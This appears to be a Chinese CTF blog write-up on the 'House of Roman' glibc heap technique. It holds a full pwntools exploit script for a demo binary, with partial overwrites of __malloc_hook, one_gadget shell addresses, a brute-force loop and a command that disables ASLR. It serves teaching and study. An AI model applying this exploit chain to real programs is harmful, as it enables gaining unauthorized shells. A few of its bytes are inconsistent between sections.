@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="fastbin attack 和 Unsortbin attack 结合的bypass ALSR，利用 12-bit 的爆破，在有uaf和off by one但没办法泄露地址时，局部写 减少随机化的程度，从而给出爆破的可能 demo分析https:&#x2F;&#x2F;github.com&#x2F;romanking98&#x2F;House-Of-Roman grxer@Ubuntu16 &#x2F;m&#x2F;h&#x2F;s&#x2F;c&#x2F;p&#x2F;h&#x2F;House-Of">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House Of Roman">
+<meta property="og:url" content="https://grxer.gitee.io/2023/08/06/House-Of-Roman/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="fastbin attack 和 Unsortbin attack 结合的bypass ALSR，利用 12-bit 的爆破，在有uaf和off by one但没办法泄露地址时，局部写 减少随机化的程度，从而给出爆破的可能 demo分析https:&#x2F;&#x2F;github.com&#x2F;romanking98&#x2F;House-Of-Roman grxer@Ubuntu16 &#x2F;m&#x2F;h&#x2F;s&#x2F;c&#x2F;p&#x2F;h&#x2F;House-Of">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/06/House-Of-Roman/image-20230807144531230.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/06/House-Of-Roman/image-20230807144800100.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/06/House-Of-Roman/image-20230807145444749.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/06/House-Of-Roman/image-20230807145855329.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/06/House-Of-Roman/image-20230807150730458.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/06/House-Of-Roman/image-20230807150811005.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/08/06/House-Of-Roman/image-20230807161504915.png">
+<meta property="article:published_time" content="2023-08-06T14:56:11.000Z">
+<meta property="article:modified_time" content="2023-08-12T05:35:46.631Z">
+<meta property="article:author" content="bxz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/08/06/House-Of-Roman/image-20230807144531230.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>House Of Roman</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 lrt">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/08/08/first-kernelpwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/05/House-of-Rabbit/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/08/06/House-Of-Roman/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&text=House Of Roman"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&is_video=false&description=House Of Roman"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=House Of Roman&body=Check out this article: https://grxer.gitee.io/2023/08/06/House-Of-Roman/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&title=House Of Roman"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&name=House Of Roman&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/08/06/House-Of-Roman/&t=House Of Roman"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#demo%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">demo分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text">1.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.2.</span> <span class="toc-text">2.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-number">1.3.</span> <span class="toc-text">3.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-number">1.4.</span> <span class="toc-text">4.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5"><span class="toc-number">1.5.</span> <span class="toc-text">5.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6"><span class="toc-number">1.6.</span> <span class="toc-text">6.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7"><span class="toc-number">1.7.</span> <span class="toc-text">7.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        House Of Roman
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-06T14:56:11.000Z" itemprop="datePublished">2023-08-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>fastbin attack 和 Unsortbin attack 结合的bypass ALSR，利用 12-bit 的爆破，在有uaf和off by one但没办法泄露地址时，<strong>局部写 减少随机化的程度，从而给出爆破的可能</strong></p>
+<h2 id="demo分析"><a href="#demo分析" class="headerlink" title="demo分析"></a>demo分析</h2><p><a target="_blank" rel="noopener" href="https://github.com/romanking98/House-Of-Roman">https://github.com/romanking98/House-Of-Roman</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/c/p/h/House-Of-Roman&gt; checksec ./new_chall </span><br><span class="line">[*] &#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/House-Of-Roman/new_chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>write_chunk有off by one</p>
+<p>free_chunk有uaf 和 double free</p>
+<p>思路大致就是下面两个方面</p>
+<ul>
+<li><p>利用unsortedbin attach 往malloc_hook里写入unsortedbin的值</p>
+</li>
+<li><p>利用fastbin attach来控制malloc_hook，12bit局部写malloc_hook里unsortedbin的值为ogg</p>
+</li>
+</ul>
+<h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) # <span class="number">0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) # d0</span><br><span class="line"><span class="title function_">create</span><span class="params">(<span class="number">0x68</span>,<span class="number">2</span>)</span>  # 0x70</span><br><span class="line"></span><br><span class="line">fake = b<span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x71</span>)  #<span class="meta"># fake size</span></span><br></pre></td></tr></table></figure>
+
+<p>首先把chunk1+0x78处写上size0x71用于后面fastbinattach</p>
+<p><img src="/2023/08/06/House-Of-Roman/image-20230807144531230.png" alt="image-20230807144531230"></p>
+<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)把unsortbin写入</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/House-Of-Roman/image-20230807144800100.png" alt="image-20230807144800100"></p>
+<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x68,3)  # b</span><br><span class="line">create(0x68,15)</span><br><span class="line">create(0x68,18)</span><br><span class="line">over = b&quot;A&quot;*0x18  # off by one</span><br><span class="line">over += b&quot;\x71&quot;  # set chunk  1&#x27;s size --&gt; 0x71</span><br><span class="line">edit(0,over)</span><br><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line">heap_po = b&quot;\x20&quot;</span><br><span class="line"># b()</span><br><span class="line">edit(3,heap_po)</span><br></pre></td></tr></table></figure>
+
+<p>利用off by one和uaf把chunk1放到fastbin链表</p>
+<p><img src="/2023/08/06/House-Of-Roman/image-20230807145444749.png" alt="image-20230807145444749"></p>
+<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook_nearly = <span class="string">b&quot;\xed\x1a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;__malloc_hook</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 &lt;__malloc_hook&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">find_fake_fast 0x7ffff7dd1b10 0x70</span></span><br><span class="line">FAKE CHUNKS</span><br><span class="line">Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0x7ffff7dd1aed</span><br><span class="line">prev_size: 0x-822fda0000000</span><br><span class="line">size: 0x7f</span><br><span class="line">fd: 0x-856d160000000</span><br><span class="line">bk: 0x-856d58fffff81</span><br><span class="line">fd_nextsize: 0x7f</span><br><span class="line">bk_nextsize: 0x00</span><br></pre></td></tr></table></figure>
+
+<p>在mallochook上方找一个可以绕过大小检测的堆块，利用uaf把他链入fastbin里</p>
+<p><img src="/2023/08/06/House-Of-Roman/image-20230807145855329.png" alt="image-20230807145855329"></p>
+<p>然后就可以申请出来0x7ffff7dd1aed控制mallochook值了</p>
+<h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(15)</span><br><span class="line">edit(15,p64(0x00))</span><br></pre></td></tr></table></figure>
+
+<p>用来把坏掉的fastbin修复</p>
+<h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><p>接下来就是unsortedbin攻击</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">po = b<span class="string">&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += b<span class="string">&quot;\x00\x1b&quot;</span> #malloc_hook0x7ffff7dd1b10<span class="number">-0x10</span>的位置</span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/House-Of-Roman/image-20230807150730458.png" alt="image-20230807150730458"></p>
+<p><img src="/2023/08/06/House-Of-Roman/image-20230807150811005.png" alt="image-20230807150811005"></p>
+<p>然后create(0xc8,1)把bck-&gt;fd  即malloc_hook里写入unsorted_chunks的值</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure>
+
+<h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">over = b<span class="string">&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="meta"># padding for malloc_hook</span></span><br><span class="line">over += b<span class="string">&quot;\xa4\xd3\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">b()</span><br><span class="line"><span class="built_in">free</span>(<span class="number">18</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">18</span>)</span><br></pre></td></tr></table></figure>
+
+<p>利用之前申请到的包含malloc-hook的堆来修改unsorted_chunks为ogg，free时触发malloc_printerr 从而触发mallochook的ogg</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在第四步malloc_hook和第七步的ogg时需要爆破的，由于aslr按照页来随机，所以后面12bit的数字是不变的，我们分析时将aslr关闭<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>,写完exp后再打开运行多次exp，就会有机率爆破到地址一样的情况</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in `seq 1 5000`; do python exp.py; done;</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn</span><br><span class="line"><span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./new_chall&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;3. Free&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,idx</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line">name = <span class="string">b&quot;A&quot;</span>*<span class="number">20</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x931&#x27;)#free</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># 0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># d0</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">2</span>)  <span class="comment"># 0x70</span></span><br><span class="line"></span><br><span class="line">fake = <span class="string">b&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x71</span>)  <span class="comment">## fake size</span></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line"><span class="comment">##free掉1到unsortbin，再申请出来就会有unsortedbin地址</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">3</span>)  <span class="comment"># b</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">15</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">18</span>)</span><br><span class="line">over = <span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span>  <span class="comment"># off by one</span></span><br><span class="line">over += <span class="string">b&quot;\x71&quot;</span>  <span class="comment"># set chunk  1&#x27;s size --&gt; 0x71</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#利用uaf把堆块1链入fastbiin</span></span><br><span class="line">heap_po = <span class="string">b&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line"><span class="comment">#修改fd为mallochook上方</span></span><br><span class="line">malloc_hook_nearly = <span class="string">b&quot;\xed\x1a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#把mallochook包含到堆块里</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#修复坏掉的fastbin</span></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>))</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment"># unsortedbin attach</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">b&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">b&quot;\x00\x1b&quot;</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line">dbpie(<span class="string">&#x27;0x09B8&#x27;</span>)<span class="comment">#malloc</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用之前申请的包含mallochook的堆块去局部覆写malloc_hook</span></span><br><span class="line">over = <span class="string">b&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line">over += <span class="string">b&quot;\xa4\xd2\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;***\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    resp = io.recv(<span class="number">4</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string">0x7ffff7a52226</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7a5227a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7afd3a4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7afe247</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/House-Of-Roman/image-20230807161504915.png" alt="image-20230807161504915"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
